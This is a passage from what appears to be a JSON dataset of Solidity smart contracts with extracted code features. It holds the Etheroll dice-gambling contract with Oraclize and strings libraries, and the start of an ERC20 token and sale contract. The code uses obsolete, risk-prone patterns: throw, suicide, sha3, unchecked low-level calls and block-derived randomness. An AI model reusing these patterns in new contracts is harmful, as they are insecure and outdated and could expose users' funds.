(bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\nlibrary strings {\n struct slice {\n uint _len;\n uint _ptr;\n }\n function memcpy(uint dest, uint src, uint len) private {\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n }\n function toSlice(string self) internal returns (slice) {\n uint ptr;\n assembly {\n ptr := add(self, 0x20)\n }\n return slice(bytes(self).length, ptr);\n }\n function len(bytes32 self) internal returns (uint) {\n uint ret;\n if (self == 0)\n return 0;\n if (self & 0xffffffffffffffffffffffffffffffff == 0) {\n ret += 16;\n self = bytes32(uint(self) / 0x100000000000000000000000000000000);\n }\n if (self & 0xffffffffffffffff == 0) {\n ret += 8;\n self = bytes32(uint(self) / 0x10000000000000000);\n }\n if (self & 0xffffffff == 0) {\n ret += 4;\n self = bytes32(uint(self) / 0x100000000);\n }\n if (self & 0xffff == 0) {\n ret += 2;\n self = bytes32(uint(self) / 0x10000);\n }\n if (self & 0xff == 0) {\n ret += 1;\n }\n return 32 - ret;\n }\n function toSliceB32(bytes32 self) internal returns (slice ret) {\n assembly {\n let ptr := mload(0x40)\n mstore(0x40, add(ptr, 0x20))\n mstore(ptr, self)\n mstore(add(ret, 0x20), ptr)\n }\n ret._len = len(self);\n }\n function copy(slice self) internal returns (slice) {\n return slice(self._len, self._ptr);\n }\n function toString(slice self) internal returns (string) {\n var ret = new string(self._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n return ret;\n }\n function len(slice self) internal returns (uint) {\n var ptr = self._ptr - 31;\n var end = ptr + self._len;\n for (uint len = 0; ptr < end; len++) {\n uint8 b;\n assembly { b := and(mload(ptr), 0xFF) }\n if (b < 0x80) {\n ptr += 1;\n } else if(b < 0xE0) {\n ptr += 2;\n } else if(b < 0xF0) {\n ptr += 3;\n } else if(b < 0xF8) {\n ptr += 4;\n } else if(b < 0xFC) {\n ptr += 5;\n } else {\n ptr += 6;\n }\n }\n return len;\n }\n function empty(slice self) internal returns (bool) {\n return self._len == 0;\n }\n function compare(slice self, slice other) internal returns (int) {\n uint shortest = self._len;\n if (other._len < self._len)\n shortest = other._len;\n var selfptr = self._ptr;\n var otherptr = other._ptr;\n for (uint idx = 0; idx < shortest; idx += 32) {\n uint a;\n uint b;\n assembly {\n a := mload(selfptr)\n b := mload(otherptr)\n }\n if (a != b) {\n uint mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\n var diff = (a & mask) - (b & mask);\n if (diff != 0)\n return int(diff);\n }\n selfptr += 32;\n otherptr += 32;\n }\n return int(self._len) - int(other._len);\n }\n function equals(slice self, slice other) internal returns (bool) {\n return compare(self, other) == 0;\n }\n function nextRune(slice self, slice rune) internal returns (slice) {\n rune._ptr = self._ptr;\n if (self._len == 0) {\n rune._len = 0;\n return rune;\n }\n uint len;\n uint b;\n assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\n if (b < 0x80) {\n len = 1;\n } else if(b < 0xE0) {\n len = 2;\n } else if(b < 0xF0) {\n len = 3;\n } else {\n len = 4;\n }\n if (len > self._len) {\n rune._len = self._len;\n self._ptr += self._len;\n self._len = 0;\n return rune;\n }\n self._ptr += len;\n self._len -= len;\n rune._len = len;\n return rune;\n }\n function nextRune(slice self) internal returns (slice ret) {\n nextRune(self, ret);\n }\n function ord(slice self) internal returns (uint ret) {\n if (self._len == 0) {\n return 0;\n }\n uint word;\n uint len;\n uint div = 2 ** 248;\n assembly { word:= mload(mload(add(self, 32))) }\n var b = word / div;\n if (b < 0x80) {\n ret = b;\n len = 1;\n } else if(b < 0xE0) {\n ret = b & 0x1F;\n len = 2;\n } else if(b < 0xF0) {\n ret = b & 0x0F;\n len = 3;\n } else {\n ret = b & 0x07;\n len = 4;\n }\n if (len > self._len) {\n return 0;\n }\n for (uint i = 1; i < len; i++) {\n div = div / 256;\n b = (word / div) & 0xFF;\n if (b & 0xC0 != 0x80) {\n return 0;\n }\n ret = (ret * 64) | (b & 0x3F);\n }\n return ret;\n }\n function keccak(slice self) internal returns (bytes32 ret) {\n assembly {\n ret := sha3(mload(add(self, 32)), mload(self))\n }\n }\n function startsWith(slice self, slice needle) internal returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n if (self._ptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let len := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n return equal;\n }\n function beyond(slice self, slice needle) internal returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n bool equal = true;\n if (self._ptr != needle._ptr) {\n assembly {\n let len := mload(needle)\n let selfptr := mload(add(self, 0x20))\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n }\n if (equal) {\n self._len -= needle._len;\n self._ptr += needle._len;\n }\n return self;\n }\n function endsWith(slice self, slice needle) internal returns (bool) {\n if (self._len < needle._len) {\n return false;\n }\n var selfptr = self._ptr + self._len - needle._len;\n if (selfptr == needle._ptr) {\n return true;\n }\n bool equal;\n assembly {\n let len := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n return equal;\n }\n function until(slice self, slice needle) internal returns (slice) {\n if (self._len < needle._len) {\n return self;\n }\n var selfptr = self._ptr + self._len - needle._len;\n bool equal = true;\n if (selfptr != needle._ptr) {\n assembly {\n let len := mload(needle)\n let needleptr := mload(add(needle, 0x20))\n equal := eq(sha3(selfptr, len), sha3(needleptr, len))\n }\n }\n if (equal) {\n self._len -= needle._len;\n }\n return self;\n }\n function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\n uint ptr;\n uint idx;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n assembly {\n let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\n let needledata := and(mload(needleptr), mask)\n let end := add(selfptr, sub(selflen, needlelen))\n ptr := selfptr\n loop:\n jumpi(exit, eq(and(mload(ptr), mask), needledata))\n ptr := add(ptr, 1)\n jumpi(loop, lt(sub(ptr, 1), end))\n ptr := add(selfptr, selflen)\n exit:\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr;\n for (idx = 0; idx <= selflen - needlelen; idx++) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr;\n ptr += 1;\n }\n }\n }\n return selfptr + selflen;\n }\n function rfindPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private returns (uint) {\n uint ptr;\n if (needlelen <= selflen) {\n if (needlelen <= 32) {\n assembly {\n let mask := not(sub(exp(2, mul(8, sub(32, needlelen))), 1))\n let needledata := and(mload(needleptr), mask)\n ptr := add(selfptr, sub(selflen, needlelen))\n loop:\n jumpi(ret, eq(and(mload(ptr), mask), needledata))\n ptr := sub(ptr, 1)\n jumpi(loop, gt(add(ptr, 1), selfptr))\n ptr := selfptr\n jump(exit)\n ret:\n ptr := add(ptr, needlelen)\n exit:\n }\n return ptr;\n } else {\n bytes32 hash;\n assembly { hash := sha3(needleptr, needlelen) }\n ptr = selfptr + (selflen - needlelen);\n while (ptr >= selfptr) {\n bytes32 testHash;\n assembly { testHash := sha3(ptr, needlelen) }\n if (hash == testHash)\n return ptr + needlelen;\n ptr -= 1;\n }\n }\n }\n return selfptr;\n }\n function find(slice self, slice needle) internal returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len -= ptr - self._ptr;\n self._ptr = ptr;\n return self;\n }\n function rfind(slice self, slice needle) internal returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n self._len = ptr - self._ptr;\n return self;\n }\n function split(slice self, slice needle, slice token) internal returns (slice) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = self._ptr;\n token._len = ptr - self._ptr;\n if (ptr == self._ptr + self._len) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n self._ptr = ptr + needle._len;\n }\n return token;\n }\n function split(slice self, slice needle) internal returns (slice token) {\n split(self, needle, token);\n }\n function rsplit(slice self, slice needle, slice token) internal returns (slice) {\n uint ptr = rfindPtr(self._len, self._ptr, needle._len, needle._ptr);\n token._ptr = ptr;\n token._len = self._len - (ptr - self._ptr);\n if (ptr == self._ptr) {\n self._len = 0;\n } else {\n self._len -= token._len + needle._len;\n }\n return token;\n }\n function rsplit(slice self, slice needle) internal returns (slice token) {\n rsplit(self, needle, token);\n }\n function count(slice self, slice needle) internal returns (uint count) {\n uint ptr = findPtr(self._len, self._ptr, needle._len, needle._ptr) + needle._len;\n while (ptr <= self._ptr + self._len) {\n count++;\n ptr = findPtr(self._len - (ptr - self._ptr), ptr, needle._len, needle._ptr) + needle._len;\n }\n }\n function contains(slice self, slice needle) internal returns (bool) {\n return rfindPtr(self._len, self._ptr, needle._len, needle._ptr) != self._ptr;\n }\n function concat(slice self, slice other) internal returns (string) {\n var ret = new string(self._len + other._len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n memcpy(retptr, self._ptr, self._len);\n memcpy(retptr + self._len, other._ptr, other._len);\n return ret;\n }\n function join(slice self, slice[] parts) internal returns (string) {\n if (parts.length == 0)\n return \"\";\n uint len = self._len * (parts.length - 1);\n for(uint i = 0; i < parts.length; i++)\n len += parts[i]._len;\n var ret = new string(len);\n uint retptr;\n assembly { retptr := add(ret, 32) }\n for(i = 0; i < parts.length; i++) {\n memcpy(retptr, parts[i]._ptr, parts[i]._len);\n retptr += parts[i]._len;\n if (i < parts.length - 1) {\n memcpy(retptr, self._ptr, self._len);\n retptr += self._len;\n }\n }\n return ret;\n }\n}\ncontract DSSafeAddSub {\n function safeToAdd(uint a, uint b) internal returns (bool) {\n return (a + b >= a);\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n if (!safeToAdd(a, b)) throw;\n return a + b;\n }\n function safeToSubtract(uint a, uint b) internal returns (bool) {\n return (b <= a);\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n if (!safeToSubtract(a, b)) throw;\n return a - b;\n }\n}\ncontract Etheroll is usingOraclize, DSSafeAddSub {\n using strings for *;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n if(((((_betSize * (100-(safeSub(_playerNumber,1)))) / (safeSub(_playerNumber,1))+_betSize))*houseEdge/houseEdgeDivisor)-_betSize > maxProfit || _betSize < minBet || _playerNumber < minNumber || _playerNumber > maxNumber) throw;\n _;\n }\n modifier gameIsActive {\n if(gamePaused == true) throw;\n _;\n }\n modifier payoutsAreActive {\n if(payoutsPaused == true) throw;\n _;\n }\n modifier onlyOraclize {\n if (msg.sender != oraclize_cbAddress()) throw;\n _;\n }\n modifier onlyOwner {\n if (msg.sender != owner) throw;\n _;\n }\n modifier onlyTreasury {\n if (msg.sender != treasury) throw;\n _;\n }\n uint constant public maxProfitDivisor = 1000000;\n uint constant public houseEdgeDivisor = 1000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n bool public gamePaused;\n uint32 public gasForOraclize;\n address public owner;\n bool public payoutsPaused;\n address public treasury;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet;\n int public totalBets = 5671;\n uint public maxPendingPayouts;\n uint public totalWeiWon = 2091633232860934129948;\n uint public totalWeiWagered = 10852397031892670514693;\n mapping (bytes32 => address) playerAddress;\n mapping (bytes32 => address) playerTempAddress;\n mapping (bytes32 => bytes32) playerBetId;\n mapping (bytes32 => uint) playerBetValue;\n mapping (bytes32 => uint) playerTempBetValue;\n mapping (bytes32 => uint) playerDieResult;\n mapping (bytes32 => uint) playerNumber;\n mapping (address => uint) playerPendingWithdrawals;\n mapping (bytes32 => uint) playerProfit;\n mapping (bytes32 => uint) playerTempReward;\n event LogBet(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RewardValue, uint ProfitValue, uint BetValue, uint PlayerNumber);\n event LogResult(uint indexed ResultSerialNumber, bytes32 indexed BetID, address indexed PlayerAddress, uint PlayerNumber, uint DiceResult, uint Value, int Status, bytes Proof);\n event LogRefund(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RefundValue);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n function Etheroll() {\n owner = msg.sender;\n treasury = msg.sender;\n oraclize_setNetwork(networkID_auto);\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n ownerSetHouseEdge(990);\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(100000000000000000);\n gasForOraclize = 235000;\n }\n function playerRollDice(uint rollUnder) public\n payable\n gameIsActive\n betIsValid(msg.value, rollUnder)\n {\n bytes32 rngId = oraclize_query(\"nested\", \"[URL] ['json(https:\n playerBetId[rngId] = rngId;\n playerNumber[rngId] = rollUnder;\n playerBetValue[rngId] = msg.value;\n playerAddress[rngId] = msg.sender;\n playerProfit[rngId] = ((((msg.value * (100-(safeSub(rollUnder,1)))) / (safeSub(rollUnder,1))+msg.value))*houseEdge/houseEdgeDivisor)-msg.value;\n maxPendingPayouts = safeAdd(maxPendingPayouts, playerProfit[rngId]);\n if(maxPendingPayouts >= contractBalance) throw;\n LogBet(playerBetId[rngId], playerAddress[rngId], safeAdd(playerBetValue[rngId], playerProfit[rngId]), playerProfit[rngId], playerBetValue[rngId], playerNumber[rngId]);\n }\n function __callback(bytes32 myid, string result, bytes proof) public\n onlyOraclize\n payoutsAreActive\n {\n if (playerAddress[myid]==0x0) throw;\n var sl_result = result.toSlice();\n sl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice());\n uint serialNumberOfResult = parseInt(sl_result.split(', '.toSlice()).toString());\n playerDieResult[myid] = parseInt(sl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice()).toString());\n playerTempAddress[myid] = playerAddress[myid];\n delete playerAddress[myid];\n playerTempReward[myid] = playerProfit[myid];\n playerProfit[myid] = 0;\n maxPendingPayouts = safeSub(maxPendingPayouts, playerTempReward[myid]);\n playerTempBetValue[myid] = playerBetValue[myid];\n playerBetValue[myid] = 0;\n totalBets += 1;\n totalWeiWagered += playerTempBetValue[myid];\n if(playerDieResult[myid]==0 || bytes(result).length == 0 || bytes(proof).length == 0){\n LogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 3, proof);\n if(!playerTempAddress[myid].send(playerTempBetValue[myid])){\n LogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 4, proof);\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempBetValue[myid]);\n }\n return;\n }\n if(playerDieResult[myid] < playerNumber[myid]){\n contractBalance = safeSub(contractBalance, playerTempReward[myid]);\n totalWeiWon = safeAdd(totalWeiWon, playerTempReward[myid]);\n playerTempReward[myid] = safeAdd(playerTempReward[myid], playerTempBetValue[myid]);\n LogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 1, proof);\n setMaxProfit();\n if(!playerTempAddress[myid].send(playerTempReward[myid])){\n LogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 2, proof);\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempReward[myid]);\n }\n return;\n }\n if(playerDieResult[myid] >= playerNumber[myid]){\n LogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 0, proof);\n contractBalance = safeAdd(contractBalance, (playerTempBetValue[myid]-1));\n setMaxProfit();\n if(!playerTempAddress[myid].send(1)){\n playerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], 1);\n }\n return;\n }\n }\n function playerWithdrawPendingTransactions() public\n payoutsAreActive\n returns (bool)\n {\n uint withdrawAmount = playerPendingWithdrawals[msg.sender];\n playerPendingWithdrawals[msg.sender] = 0;\n if (msg.sender.call.value(withdrawAmount)()) {\n return true;\n } else {\n playerPendingWithdrawals[msg.sender] = withdrawAmount;\n return false;\n }\n }\n function playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) {\n return playerPendingWithdrawals[addressToCheck];\n }\n function setMaxProfit() internal {\n maxProfit = (contractBalance*maxProfitAsPercentOfHouse)/maxProfitDivisor;\n }\n function ()\n payable\n onlyTreasury\n {\n contractBalance = safeAdd(contractBalance, msg.value);\n setMaxProfit();\n }\n function ownerSetOraclizeSafeGas(uint32 newSafeGasToOraclize) public\n onlyOwner\n {\n gasForOraclize = newSafeGasToOraclize;\n }\n function ownerUpdateContractBalance(uint newContractBalanceInWei) public\n onlyOwner\n {\n contractBalance = newContractBalanceInWei;\n }\n function ownerSetHouseEdge(uint newHouseEdge) public\n onlyOwner\n {\n houseEdge = newHouseEdge;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n if(newMaxProfitAsPercent > 10000) throw;\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferEther(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = safeSub(contractBalance, amount);\n setMaxProfit();\n if(!sendTo.send(amount)) throw;\n LogOwnerTransfer(sendTo, amount);\n }\n function ownerRefundPlayer(bytes32 originalPlayerBetId, address sendTo, uint originalPlayerProfit, uint originalPlayerBetValue) public\n onlyOwner\n {\n maxPendingPayouts = safeSub(maxPendingPayouts, originalPlayerProfit);\n if(!sendTo.send(originalPlayerBetValue)) throw;\n LogRefund(originalPlayerBetId, sendTo, originalPlayerBetValue);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerPausePayouts(bool newPayoutStatus) public\n onlyOwner\n {\n payoutsPaused = newPayoutStatus;\n }\n function ownerSetTreasury(address newTreasury) public\n onlyOwner\n {\n treasury = newTreasury;\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n suicide(owner);\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb15b8"
  },
  "filename": "35480.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n ) {\n balances[msg.sender] = 100000000000;\n totalSupply = 100000000000;\n name = \"EXRP Network Original\";\n decimals = 0;\n symbol = \"EXRN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\ncontract ExrnSale {\n address public owner;\n uint256 public rate = 100 * 1e5;\n HumanStandardToken public token = HumanStandardToken(0x607122D68925c9D5DEDDdE4B284fdef81aD27AF6);\n function 